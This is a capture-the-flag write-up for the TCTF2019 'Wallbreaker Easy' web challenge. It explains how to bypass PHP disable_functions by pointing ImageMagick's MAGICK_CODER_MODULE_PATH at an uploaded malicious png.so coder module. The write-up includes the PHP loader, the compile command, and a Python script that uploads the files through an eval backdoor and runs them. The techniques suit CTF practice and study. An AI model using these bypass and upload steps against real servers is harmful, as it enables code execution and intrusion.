# Wallbreaker Easy

TCFT2019 Web2

```php
<?php
$dir = "/tmp/" . md5("$_SERVER[REMOTE_ADDR]");
mkdir($dir);
ini_set('open_basedir', '/var/www/html:' . $dir);
?>
<!DOCTYPE html><html><head><style>.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}</style></head><body>
<pre class="pre"><code>Imagick is a awesome library for hackers to break `disable_functions`.
So I installed php-imagick in the server, opened a `backdoor` for you.
Let's try to execute `/readflag` to get the flag.
Open basedir: <?php echo ini_get('open_basedir');?>

<?php eval($_POST["backdoor"]);?>
Hint: eval($_POST["backdoor"]);
</code></pre></body>

```

Disable_functions:

```php
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
```

We  set the PATH instead of LD_PRELOAD by putenv.

We found an interesting parameter,MAGICK_CODER_MODULE_PATH , in the document,  it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory.

> <https://www.imagemagick.org/script/resources.php#Environment%20Variables>

PHP code is as follows

```php
<?php
/*
	This examples was ported from Imagemagick C examples.
*/

$basedir = "{REPLACE_BASEDIR}";

putenv("MAGICK_CODER_MODULE_PATH=" . $basedir);
// putenv("MAGICK_CODER_MODULE_PATH=.");
// putenv("MAGICK_CODER_FILTER_PATH=" . $basedir);
// putenv("LD_LIBRARY_PATH=/");
// putenv("MAGICK_HOME=.");
// putenv("MAGICK_CONFIGURE_PATH=/");

putenv("BASEDIR=" . $basedir);

/* Create Imagick objects */
$Imagick = new Imagick();

/* Create ImagickDraw objects */
$ImagickDraw = new ImagickDraw();

/* Create ImagickPixel objects */
$ImagickPixel = new ImagickPixel();

/* This array contains polygon geometry */
$array = array( array( "x" => 378.1, "y" => 81.72 ),
                array( "x" => 381.1, "y" => 79.56 ),
                array( "x" => 384.3, "y" => 78.12 ),
                array( "x" => 387.6, "y" => 77.33 ),
                array( "x" => 391.1, "y" => 77.11 ),
                array( "x" => 394.6, "y" => 77.62 ),
                array( "x" => 397.8, "y" => 78.77 ),
                array( "x" => 400.9, "y" => 80.57 ),
                array( "x" => 403.6, "y" => 83.02 ),
                array( "x" => 523.9, "y" => 216.8 ),
                array( "x" => 526.2, "y" => 219.7 ),
                array( "x" => 527.6, "y" => 223 ),
                array( "x" => 528.4, "y" => 226.4 ),
                array( "x" => 528.6, "y" => 229.8 ),
                array( "x" => 528.0, "y" => 233.3 ),
                array( "x" => 526.9, "y" => 236.5 ),
                array( "x" => 525.1, "y" => 239.5 ),
                array( "x" => 522.6, "y" => 242.2 ),
                array( "x" => 495.9, "y" => 266.3 ),
                array( "x" => 493, "y" => 268.5 ),
                array( "x" => 489.7, "y" => 269.9 ),
                array( "x" => 486.4, "y" => 270.8 ),
                array( "x" => 482.9, "y" => 270.9 ),
                array( "x" => 479.5, "y" => 270.4 ),
                array( "x" => 476.2, "y" => 269.3 ),
                array( "x" => 473.2, "y" => 267.5 ),
                array( "x" => 470.4, "y" => 265 ),
                array( "x" => 350, "y" => 131.2 ),
                array( "x" => 347.8, "y" => 128.3 ),
                array( "x" => 346.4, "y" => 125.1 ),
                array( "x" => 345.6, "y" => 121.7 ),
                array( "x" => 345.4, "y" => 118.2 ),
                array( "x" => 346, "y" => 114.8 ),
                array( "x" => 347.1, "y" => 111.5 ),
                array( "x" => 348.9, "y" => 108.5 ),
                array( "x" => 351.4, "y" => 105.8 ),
                array( "x" => 378.1, "y" => 81.72 ),
              );

/* This ImagickPixel is used to set background color */
$ImagickPixel->setColor( 'gray' );

/* Create new image, set color to gray and format to png*/
$Imagick->newImage( 700, 500, $ImagickPixel );
$Imagick->setImageFormat( 'png' );

/* Create the polygon*/
$ImagickDraw->polygon( $array );

/* Render the polygon to image*/
$Imagick->drawImage( $ImagickDraw );

/* Send headers and output the image */
header( "Content-Type: image/{$Imagick->getImageFormat()}" );
#echo $Imagick->getImageBlob( );
echo "Done.\n";

?>

```

Then,we compile a png.so.

 To ensure the success of php execution, I directly modify the original png.c.

![4](http://momomoxiaoxi.com/img/post/TCTF2019/4.png)

```bash
gcc -I ./ -shared -fPIC png.c -o png.so
```

Finally, we upload all the png.la png.so exploit.php files to the website and execute them to get the flag.

EXP is as follows:

```python
#!/usr/bin/env python
# coding: utf-8
# gcc -shared -fPIC exp.c -o png.so
import requests
import base64

session = requests.Session()
target = "http://111.186.63.208:31340/index.php"
headers = {"Cache-Control":"max-age=0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36","Connection":"close","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8","Content-Type":"application/x-www-form-urlencoded"}
proxies = {"http":"http://127.0.0.1:7890"}
userhash = '8f10f5b0ed8b32372911c55aa59344b4'

def exp(payload):
    paramsPost = {"backdoor":payload}
    #response = session.post(target,proxies=proxies, data=paramsPost, headers=headers)
    response = session.post(target, data=paramsPost, headers=headers)
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)


def put_file(filename):
	with open(filename, "rb") as f:
		data = f.read().replace('{REPLACE_BASEDIR}', '/tmp/{}'.format(userhash))
    	content = base64.b64encode(data).decode("utf-8")

	payload  = 'echo file_put_contents("/tmp/{}/{}",base64_decode("{}"));'.format(userhash, filename, content)
	# print(payload)
	exp(payload)


def get_file(filename):
	payload = 'var_dump(file_get_contents("/tmp/{}/{}"));'.format(userhash, filename)
	exp(payload)


def main():
	put_file('png.la')
	put_file('png.so')
	put_file('exploit.php')
	# get_file('exploit.php')
	# payload = open('exploit.php').read().replace('<?php', '').replace('?>', '')
	payload  = 'echo 1337;require "/tmp/{}/exploit.php";echo 1338;'.format(userhash)
	exp(payload)
	get_file('flag'.format(userhash))

if __name__ == '__main__':
	main()
```

The attack effect is as follows:

![5](http://momomoxiaoxi.com/img/post/TCTF2019/5.png)



Chinese： <http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy>

